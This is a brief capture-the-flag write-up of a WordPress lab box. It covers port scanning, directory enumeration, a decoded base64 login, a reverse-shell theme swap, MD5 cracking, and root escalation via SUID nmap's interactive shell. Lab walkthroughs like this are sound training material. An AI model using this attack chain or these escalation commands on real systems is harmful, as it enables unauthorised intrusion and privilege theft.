> Author: jak010   
> Date: 2021.05.29

## Scan
- Result
  ```text
  	Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-29 04:10 UTC
	Nmap scan report for 10.10.225.168
	Host is up (0.033s latency).
	Not shown: 997 filtered ports
	PORT    STATE  SERVICE VERSION
	22/tcp  closed ssh
	80/tcp  closed http
	443/tcp closed https

	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds
  ```

## Enumeration
  - Hidden Directory Searching
    ```text
    /js                   (Status: 301) [Size: 232] [--> http://10.10.225.168/js/]
	/images               (Status: 301) [Size: 236] [--> http://10.10.225.168/images/]
	/admin                (Status: 301) [Size: 235] [--> http://10.10.225.168/admin/]
	/wp-content           (Status: 301) [Size: 240] [--> http://10.10.225.168/wp-content/]
	/css                  (Status: 301) [Size: 233] [--> http://10.10.225.168/css/]
	/wp-admin             (Status: 301) [Size: 238] [--> http://10.10.225.168/wp-admin/]
	/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.225.168/wp-includes/]
	/xmlrpc               (Status: 405) [Size: 42]
	/blog                 (Status: 301) [Size: 234] [--> http://10.10.225.168/blog/]
	/login                (Status: 302) [Size: 0] [--> http://10.10.225.168/wp-login.php]
	/feed                 (Status: 301) [Size: 0] [--> http://10.10.225.168/feed/]
	/rss                  (Status: 301) [Size: 0] [--> http://10.10.225.168/feed/]
	/video                (Status: 301) [Size: 235] [--> http://10.10.225.168/video/]
	/sitemap              (Status: 200) [Size: 0]
	/image                (Status: 301) [Size: 0] [--> http://10.10.225.168/image/]
	/audio                (Status: 301) [Size: 235] [--> http://10.10.225.168/audio/]
	/phpmyadmin           (Status: 403) [Size: 94]
	/dashboard            (Status: 302) [Size: 0] [--> http://10.10.225.168/wp-admin/]
	/wp-login             (Status: 200) [Size: 2613]
	/0                    (Status: 301) [Size: 0] [--> http://10.10.225.168/0/]
	/readme               (Status: 200) [Size: 64]
	/atom                 (Status: 301) [Size: 0] [--> http://10.10.225.168/feed/atom/]
	/robots               (Status: 200) [Size: 41]
	/license              (Status: 200) [Size: 309]
	/intro                (Status: 200) [Size: 516314]
    ```
    - `/license`
      ```text
      what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?do you want a password or something? ZWxsaW90OkVSMjgtMDY1Mgo=
      ```
      - `echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d `
        - `Result`: elliot:ER28-0652


## Weakness WordPress 
 - `/wp-admin`
    - Credential login with `elliot:ER28-0652`
 - `wpscan`
 	- themes file path
 	  ```text
 	   /10.10.225.168/wp-content/themes/twentyfifteen/
 	  ```


## Ganing Access
 - `wp theme template change php-reverse-shell`
 
## User Escalate 
 - `password.raw-md5`
	- `robot:c3fcd3d76192e4007dfb496cca67e13b`
    	- Password: `abcdefghijklmnopqrstuvwxyz`


## Privilige Escalate
 - `find / -perm 4000 2>/dev/null`
 	- /usr/local/bin/nmap --interactive
    	- nmap> !bash

